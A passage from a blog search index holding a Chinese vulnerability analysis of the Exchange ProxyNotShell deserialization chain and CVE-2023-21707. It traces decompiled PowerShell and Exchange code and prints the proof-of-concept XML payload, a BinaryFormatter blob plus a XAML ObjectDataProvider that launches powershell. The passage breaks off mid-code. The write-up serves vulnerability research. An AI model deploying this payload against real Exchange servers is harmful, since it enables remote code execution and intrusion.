<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Proxynotshell 反序列化及 CVE-2023-21707 漏洞研究</title>
    <link href="/2023/06/01/Proxynotshell%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8ACVE-2023-21707%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    <url>/2023/06/01/Proxynotshell%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%8ACVE-2023-21707%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="流程梳理"><a href="#流程梳理" class="headerlink" title="流程梳理"></a>流程梳理</h3><p>先分析一下与 powershell 接口交互的 xml 数据的处理流程。xml 信息传入后，会被 <code>PSSerializer.Deserialize</code> 反序列化后作为 <code>PSObject</code> 类。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-comment">// System.Management.Automation.PSObject</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">object</span> lockObject = <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>();<br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">PSObject</span>(<span class="hljs-params">SerializationInfo info, StreamingContext context</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (info == <span class="hljs-literal">null</span>)<br>    &#123;<br>        <span class="hljs-keyword">throw</span> PSTraceSource.NewArgumentNullException(<span class="hljs-string">&quot;info&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">string</span> text = info.GetValue(<span class="hljs-string">&quot;CliXml&quot;</span>, <span class="hljs-keyword">typeof</span>(<span class="hljs-built_in">string</span>)) <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>;<br>    <span class="hljs-keyword">if</span> (text == <span class="hljs-literal">null</span>)<br>    &#123;<br>        <span class="hljs-keyword">throw</span> PSTraceSource.NewArgumentNullException(<span class="hljs-string">&quot;info&quot;</span>);<br>    &#125;<br>    PSObject psobject = PSObject.AsPSObject(PSSerializer.Deserialize(text));<br>    <span class="hljs-keyword">this</span>.CommonInitialization(psobject.ImmediateBaseObject);<br>    PSObject.CopyDeserializerFields(psobject, <span class="hljs-keyword">this</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>其调用链如下</p><p><img src="https://s2.loli.net/2023/06/06/BA183NvntgCDEo5.png" alt="O0eVbr16so0wLjxQ9eXc7ou6nO5.png"></p><p>而当 <code>targetTypeForDeserialization</code> 不为空时，<code>ReadOneObject</code> 会继续调用 <code>LanguagePrimitives.ConvertTo</code> 将 obj 转换为指定的类型。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">internal</span> <span class="hljs-built_in">object</span> <span class="hljs-title">ReadOneObject</span>(<span class="hljs-params"><span class="hljs-keyword">out</span> <span class="hljs-built_in">string</span> streamName</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br>                <span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != targetTypeForDeserialization)<br>                &#123;<br>                    Exception ex = <span class="hljs-literal">null</span>;<br>                    <span class="hljs-keyword">try</span><br>                    &#123;<br>                        <span class="hljs-built_in">object</span> obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization, <span class="hljs-literal">true</span>, CultureInfo.InvariantCulture, <span class="hljs-keyword">this</span>._typeTable);<br>                        PSEtwLog.LogAnalyticVerbose(PSEventId.Serializer_RehydrationSuccess, PSOpcode.Rehydration, PSTask.Serialization, PSKeyword.Serializer, <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>[]<br>                        &#123;<br>                            psobject.InternalTypeNames.Key,<br>                            targetTypeForDeserialization.FullName,<br>                            obj2.GetType().FullName<br>                        &#125;);<br>                        <span class="hljs-keyword">return</span> obj2;<br>                    &#125;<br>    <span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>targetTypeForDeserialization</code> 通过 <code>GetTargetTypeForDeserialization</code> 获取，而 <code>GetTargetTypeForDeserialization</code> 又调用了 <code>GetPSStandardMember</code>。首先调用 <code>TypeTableGetMemberDelegate</code> 根据 this 的类型和 <code>typeTable</code> 即 <code>types.ps1xml</code> 找到 <code>PSStandardMembser</code>。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">internal</span> Type <span class="hljs-title">GetTargetTypeForDeserialization</span>(<span class="hljs-params">TypeTable backupTypeTable</span>)</span><br>&#123;<br>    PSMemberInfo psstandardMember = <span class="hljs-keyword">this</span>.GetPSStandardMember(backupTypeTable, <span class="hljs-string">&quot;TargetTypeForDeserialization&quot;</span>);<br>    <span class="hljs-keyword">if</span> (psstandardMember != <span class="hljs-literal">null</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> psstandardMember.Value <span class="hljs-keyword">as</span> Type;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">internal</span> PSMemberInfo <span class="hljs-title">GetPSStandardMember</span>(<span class="hljs-params">TypeTable backupTypeTable, <span class="hljs-built_in">string</span> memberName</span>)</span><br>&#123;<br>    PSMemberInfo psmemberInfo = <span class="hljs-literal">null</span>;<br>    TypeTable typeTable = (backupTypeTable != <span class="hljs-literal">null</span>) ? backupTypeTable : <span class="hljs-keyword">this</span>.GetTypeTable();<br>    <span class="hljs-keyword">if</span> (typeTable != <span class="hljs-literal">null</span>)<br>    &#123;<br>        PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate&lt;PSMemberSet&gt;(<span class="hljs-keyword">this</span>, typeTable, <span class="hljs-string">&quot;PSStandardMembers&quot;</span>);<br>        <span class="hljs-keyword">if</span> (psmemberSet != <span class="hljs-literal">null</span>)<br>        &#123;<br>            psmemberSet.ReplicateInstance(<span class="hljs-keyword">this</span>);<br>            psmemberInfo = <span class="hljs-keyword">new</span> PSMemberInfoIntegratingCollection&lt;PSMemberInfo&gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName];<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (psmemberInfo == <span class="hljs-literal">null</span>)<br>    &#123;<br>        psmemberInfo = (<span class="hljs-keyword">this</span>.InstanceMembers[<span class="hljs-string">&quot;PSStandardMembers&quot;</span>] <span class="hljs-keyword">as</span> PSMemberSet);<br>    &#125;<br>    <span class="hljs-keyword">return</span> psmemberInfo;<br>&#125;<br></code></pre></td></tr></table></figure><p>而后调用 <code>GetMemberCollection</code>，一个从 PowerShell 的内部实现中获取 PSMemberInfo 对象集合的方法。它根据给定的 <code>viewType</code> 和从 <code>backupTypeTable</code> 获取对应的 <code>PSMemberInfo</code> 集合。</p><p>PSMemberViewTypes 是一个枚举，用来指示获取哪种类型的成员信息。它可以是以下几种：</p><ul><li>Extended：获取扩展成员，即那些由类型数据表定义的成员。</li><li>Adapted：获取适配成员，即那些由 PowerShell 适配器添加的成员。</li><li>Base：获取基础成员，即那些直接从.NET 对象继承的成员。</li></ul><p>而调用时使用的是 <code>PSMemberViewTypes.All</code>，这就导致可以通过 extended 或 adapted 属性自定义一个 Type，让 <code>GetTargetTypeForDeserialization</code> 返回自定义的类型，进行反序列化。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> Collection&lt;CollectionEntry&lt;PSMemberInfo&gt;&gt; GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable)<br>&#123;<br>    Collection&lt;CollectionEntry&lt;PSMemberInfo&gt;&gt; collection = <span class="hljs-keyword">new</span> Collection&lt;CollectionEntry&lt;PSMemberInfo&gt;&gt;();<br>    <span class="hljs-keyword">if</span> ((viewType &amp; PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (backupTypeTable == <span class="hljs-literal">null</span>)<br>        &#123;<br>            collection.Add(<span class="hljs-keyword">new</span> CollectionEntry&lt;PSMemberInfo&gt;(<span class="hljs-keyword">new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate&lt;PSMemberInfo&gt;), <span class="hljs-keyword">new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate&lt;PSMemberInfo&gt;), <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;type table members&quot;</span>));<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            collection.Add(<span class="hljs-keyword">new</span> CollectionEntry&lt;PSMemberInfo&gt;((PSObject msjObj) =&gt; PSObject.TypeTableGetMembersDelegate&lt;PSMemberInfo&gt;(msjObj, backupTypeTable), (PSObject msjObj, <span class="hljs-built_in">string</span> name) =&gt; PSObject.TypeTableGetMemberDelegate&lt;PSMemberInfo&gt;(msjObj, backupTypeTable, name), <span class="hljs-literal">true</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;type table members&quot;</span>));<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((viewType &amp; PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted)<br>    &#123;<br>        collection.Add(<span class="hljs-keyword">new</span> CollectionEntry&lt;PSMemberInfo&gt;(<span class="hljs-keyword">new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMembersDelegate(PSObject.AdapterGetMembersDelegate&lt;PSMemberInfo&gt;), <span class="hljs-keyword">new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMemberDelegate(PSObject.AdapterGetMemberDelegate&lt;PSMemberInfo&gt;), <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;adapted members&quot;</span>));<br>    &#125;<br>    <span class="hljs-keyword">if</span> ((viewType &amp; PSMemberViewTypes.Base) == PSMemberViewTypes.Base)<br>    &#123;<br>        collection.Add(<span class="hljs-keyword">new</span> CollectionEntry&lt;PSMemberInfo&gt;(<span class="hljs-keyword">new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMembersDelegate(PSObject.DotNetGetMembersDelegate&lt;PSMemberInfo&gt;), <span class="hljs-keyword">new</span> CollectionEntry&lt;PSMemberInfo&gt;.GetMemberDelegate(PSObject.DotNetGetMemberDelegate&lt;PSMemberInfo&gt;), <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;clr members&quot;</span>));<br>    &#125;<br>    <span class="hljs-keyword">return</span> collection;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ConvertTo-gadget-分析"><a href="#ConvertTo-gadget-分析" class="headerlink" title="ConvertTo gadget 分析"></a>ConvertTo gadget 分析</h3><p>根据 <a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf</a> 中关于 <code>LanguagePrimitives.ConvertTo</code> 的分析，可知其有几种可能的利用：</p><ol><li>调用任意包含一个可指定参数的 public 类的 constructor</li></ol><p>调用如下</p><p><img src="https://s2.loli.net/2023/06/06/j2wq8VXhfiLOY3g.png" alt="PuZhb1HGHoG8EmxbRUbc2VgonMO.png"></p><p><code>fromType</code> 与 <code>toType</code> 即原 obj 类型与 <code>targetTypeForDeserialization</code> 指定 type</p><p><img src="https://s2.loli.net/2023/06/06/TqKU1cs4dJrOPx2.png" alt="KphfbwvUPoRmzyxu0ukcF8oanwh.png"></p><ol><li>调用可控类的静态 public Parse(string) 方法</li></ol><p>调用如下</p><p><img src="https://s2.loli.net/2023/06/06/CTs2cZ4LRkpASDz.png" alt="V51sbl90wocqBXxa9y9cQPaenOh.png"></p><p>如下调用了 toType 的 Parse 方法</p><p><img src="https://s2.loli.net/2023/06/06/fWQpu8IDOKRezw3.png" alt="OudJbVJXQoc6xixSOZScwoYancf.png"></p><ol><li>执行自定义的 Convert</li></ol><p>通过 <code>LanguagePrimitives.FigureConversion</code> 获取对应的 <code>ConverterData</code>，其中包含对应的 <code>Converter</code>，并通过其执行进一步的 <code>Convert</code> 操作</p><p><img src="https://s2.loli.net/2023/06/06/ezu4IrgnOikmPZJ.png" alt="TtrSbhSOvolIFCxpaoicI0Ofngh.png"></p><p><img src="https://s2.loli.net/2023/06/06/OGZrv2NcpQeh9IS.png" alt="MoDkbkWQ2oGhcpxjoVPc6s0Mnwc.png"></p><h3 id="Proxynotshell-payload-分析"><a href="#Proxynotshell-payload-分析" class="headerlink" title="Proxynotshell payload 分析"></a>Proxynotshell payload 分析</h3><p>首先是 proxynotshell 的反序列化部分，情报中公布的 poc 直接修改了 python 的 pypsrp 包进行交互，xml 中还包括了很多其他所需内容。忽略其他信息，关键的类如下。即这个命令的 <code>-Identity:</code> 参数是一个 <code>Microsoft.PowerShell.Commands.Internal.Format.FormatInfoData</code> 类，包含两个属性，其中一个 Type 属性是 <code>TargetTypeForDeserialization</code> 对象。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Obj</span> <span class="hljs-attr">N</span>=<span class="hljs-string">&quot;Args&quot;</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">&quot;12&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">TNRef</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">&quot;0&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">LST</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Obj</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">&quot;13&quot;</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">MS</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">S</span> <span class="hljs-attr">N</span>=<span class="hljs-string">&quot;N&quot;</span>&gt;</span>-Identity:<span class="hljs-tag">&lt;/<span class="hljs-name">S</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">Obj</span> <span class="hljs-attr">N</span>=<span class="hljs-string">&quot;V&quot;</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">&quot;14&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">TN</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">T</span>&gt;</span>Microsoft.PowerShell.Commands.Internal.Format.FormatInfoData<span class="hljs-tag">&lt;/<span class="hljs-name">T</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">T</span>&gt;</span>System.Object<span class="hljs-tag">&lt;/<span class="hljs-name">T</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">TN</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">ToString</span>&gt;</span>Object<span class="hljs-tag">&lt;/<span class="hljs-name">ToString</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">Props</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">S</span> <span class="hljs-attr">N</span>=<span class="hljs-string">&quot;Name&quot;</span>&gt;</span>Type<span class="hljs-tag">&lt;/<span class="hljs-name">S</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">Obj</span> <span class="hljs-attr">N</span>=<span class="hljs-string">&quot;TargetTypeForDeserialization&quot;</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">TN</span> <span class="hljs-attr">RefId</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">T</span>&gt;</span>System.Exception<span class="hljs-tag">&lt;/<span class="hljs-name">T</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">T</span>&gt;</span>System.Object<span class="hljs-tag">&lt;/<span class="hljs-name">T</span>&gt;</span><br>              <span class="hljs-tag">&lt;/<span class="hljs-name">TN</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">MS</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">BA</span> <span class="hljs-attr">N</span>=<span class="hljs-string">&quot;SerializationData&quot;</span>&gt;</span>AAEAAAD /////AQAAAAAAAAAEAQAAAB9TeXN0ZW0uVW5pdHlTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAREYXRhCVVuaXR5VHlwZQxBc3NlbWJseU5hbWUBAAEIBgIAAAAgU3lzdGVtLldpbmRvd3MuTWFya3VwLlhhbWxSZWFkZXIEAAAABgMAAABYUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNQs=<span class="hljs-tag">&lt;/<span class="hljs-name">BA</span>&gt;</span><br>              <span class="hljs-tag">&lt;/<span class="hljs-name">MS</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">Obj</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">Props</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">S</span>&gt;</span><br>              &lt;![CDATA[&lt;ObjectDataProvider MethodName=&quot;Start&quot; IsInitialLoadEnabled=&quot;False&quot; xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:sd=&quot;clr-namespace:System.Diagnostics;assembly=System&quot; xmlns:x=&quot;http://schemas.microsoft.com/winfx/2006/xaml&quot;&gt; &lt;ObjectDataProvider.ObjectInstance&gt; &lt;sd:Process&gt; &lt;sd:Process.StartInfo&gt; &lt;sd:ProcessStartInfo Arguments=&quot;-e $$POWERSHELL_ENCODE_PAYLOAD_HERE$$&quot; StandardErrorEncoding=&quot;&#123;x:Null&#125;&quot; StandardOutputEncoding=&quot;&#123;x:Null&#125;&quot; UserName=&quot;&quot; Password=&quot;&#123;x:Null&#125;&quot; Domain=&quot;&quot; LoadUserProfile=&quot;False&quot; FileName=&quot;powershell&quot; /&gt; &lt;/sd:Process.StartInfo&gt; &lt;/sd:Process&gt; &lt;/ObjectDataProvider.ObjectInstance&gt; &lt;/ObjectDataProvider&gt;]]&gt;<br>          <span class="hljs-tag">&lt;<span class="hljs-name">S</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">Obj</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">MS</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">Obj</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">LST</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Obj</span>&gt;</span><br></code></pre></td></tr></table></figure><p>递归进行反序列化时，<code>TargetTypeForDeserialization</code> 首当其冲。<code>TargetTypeForDeserialization</code> 指定的类型是 <code>System.Exception</code>，这里就是上文中的第三种利用。在 <code>exchange.partial.types.ps1xml</code> 中可以找到其指定的 <code>Converter</code>。</p><p><img src="https://s2.loli.net/2023/06/06/QozgdKk1t4mAfae.png" alt="GRBEbExHzosbh2x0STRcO93wnzd.png"></p><p>找到 <code>Microsoft.Exchange.Data.SerializationTypeConverter</code>，其 convert 操作都调用了 <code>DeserializeObject</code></p><p><img src="https://s2.loli.net/2023/06/06/dEChNz24aOvV59F.png" alt="P9mwb0vQeorvmyx5Y9tciI8QnBd.png"></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">object</span> <span class="hljs-title">DeserializeObject</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sourceValue, Type destinationType</span>)</span><br>&#123;<br>    Exception ex = <span class="hljs-literal">null</span>;<br>    <span class="hljs-built_in">byte</span>[] array;<br>    <span class="hljs-built_in">string</span> text;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">this</span>.CanConvert(sourceValue, destinationType, <span class="hljs-keyword">out</span> array, <span class="hljs-keyword">out</span> text, <span class="hljs-keyword">out</span> ex))<br>    &#123;<br>        <span class="hljs-keyword">throw</span> ex;<br>    &#125;<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-keyword">try</span><br>    &#123;<br>        <span class="hljs-keyword">using</span> (MemoryStream memoryStream = <span class="hljs-keyword">new</span> MemoryStream(array))<br>        &#123;<br>            AppDomain.CurrentDomain.AssemblyResolve += SerializationTypeConverter.AssemblyHandler;<br>            <span class="hljs-keyword">try</span><br>            &#123;<br>                <span class="hljs-built_in">int</span> tickCount = Environment.TickCount;<br>                obj = <span class="hljs-keyword">this</span>.Deserialize(memoryStream);<br>                <span class="hljs-comment">// ...</span><br>            &#125;<br>            <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>DeserializeObject</code> 首先调用了 <code>CanConvert</code>，将 <code>SerializationData</code> 的值放到 <code>serializationData</code> 也就是 <code>array</code> 中，而后又赋值给 <code>memoryStream</code> 进行进一步反序列化</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">bool</span> <span class="hljs-title">CanConvert</span>(<span class="hljs-params"><span class="hljs-built_in">object</span> sourceValue, Type destinationType, <span class="hljs-keyword">out</span> <span class="hljs-built_in">byte</span>[] serializationData, <span class="hljs-keyword">out</span> <span class="hljs-built_in">string</span> stringValue, <span class="hljs-keyword">out</span> Exception error</span>)</span><br>&#123;<br>    <span class="hljs-comment">// ...</span><br>    <span class="hljs-built_in">object</span> <span class="hljs-keyword">value</span> = psobject.Properties[<span class="hljs-string">&quot;SerializationData&quot;</span>].Value;<br>    <span class="hljs-keyword">if</span> (!(<span class="hljs-keyword">value</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">byte</span>[]))<br>    &#123;<br>        error = <span class="hljs-keyword">new</span> NotSupportedException(DataStrings.ExceptionUnsupportedDataFormat(<span class="hljs-keyword">value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    stringValue = psobject.ToString();<br>    serializationData = (<span class="hljs-keyword">value</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">byte</span>[]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Deserialize</code> 中生成 <code>BinaryFormatter</code> 对数据进行进一步反序列化，而此处 <code>allowedTypes</code> 即为白名单，其中就包含有 <code>System.UnitySerializationHolder</code></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-function"><span class="hljs-keyword">internal</span> <span class="hljs-built_in">object</span> <span class="hljs-title">Deserialize</span>(<span class="hljs-params">MemoryStream stream</span>)</span><br>&#123;<br>    <span class="hljs-built_in">bool</span> strictModeStatus = Serialization.GetStrictModeStatus(DeserializeLocation.SerializationTypeConverter);<br>    <span class="hljs-keyword">return</span> ExchangeBinaryFormatterFactory.CreateBinaryFormatter(DeserializeLocation.SerializationTypeConverter, strictModeStatus, SerializationTypeConverter.allowedTypes, SerializationTypeConverter.allowedGenerics).Deserialize(stream);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/06/06/EZKipO2WbSv6glq.png" alt="G56jb19KIoWIkXxRbOfc6hZUni7.png"></p><p>简单查看序列化的内容 base64 解码即可看出，借用 <code>System.UnitySerializationHolder</code> 反序列化后 <code>FormatInfoData</code> 的 Type 是一个 <code>System.Windows.Markup.XamlReader</code> 实例</p><p><img src="https://s2.loli.net/2023/06/06/p2huyOAQIomLefP.png" alt="RsKsb8xEpoh2flxfct0cUnFfn9d.png"></p><p>而接下来进行进一步反序列化，但由于 <code>types.ps1xml</code> 中并没有指定 <code>FormatInfoData</code> 的相关信息，而根据<a href="https://datangqian.feishu.cn/docx/RrEPdkmiuobqpfxQ5Eyc9lg7nAc#FSQ8dTmP6oxgbUxAGLncJoYjn0b">流程梳理</a>最后部分的叙述可知，此时的 <code>targetTypeForDeserialization</code> 就是其 Type 属性，也就是那个 <code>System.Windows.Markup.XamlReader</code> 实例。而此时再利用 gadget 的第二条，调用其 <code>Parse</code> 方法，解析 xaml 语句即可实现利用启动 powershell 进行 rce</p><p>修复：引入了一个 <code>UnitySerializationHolderSurrogateSelector</code>，会在 <code>System.UnitySerializationHolder</code> 反序列化过程中验证目标的类型。因此，<code>Parse(string)</code> 不再可能利用此漏洞进行调用。</p><h3 id="CVE-2023-21707-分析"><a href="#CVE-2023-21707-分析" class="headerlink" title="CVE-2023-21707 分析"></a>CVE-2023-21707 分析</h3><p>类似于 Proxynotshell 的利用流程，直到调用了 <code>BinaryFormatter</code> 的反序列化。</p><p>在 <code>BinaryFormatter</code> 反序列化的白名单中，又找到了一个特殊的类：<code>Microsoft.Exchange.Security.Authentication.GenericSidIdentity</code>，这个类也在白名单中。</p><p><img src="https://s2.loli.net/2023/06/06/IsoqUZYxcCkev46.png" alt="AwbBbaxYYocsXIxqf3McEYBTn2f.png"></p><p>且这个类继承了 <code>ClaimsIdentity</code> 这个著名的.Net 反序列化 gadget 类。</p><p><img src="https://s2.loli.net/2023/06/06/wMY1F8tLZkvhRS3.png" alt="BoU6b92I1oC9eFxMOH6chxVtnBg.png"></p><p><code>ClaimsIdentity</code> 的 <code>OnDeserializedMethod</code> 中对 <code>m_serializedClaims</code> 进行了二次反序列化</p><figure class="highlight csharp"><table><tr><td 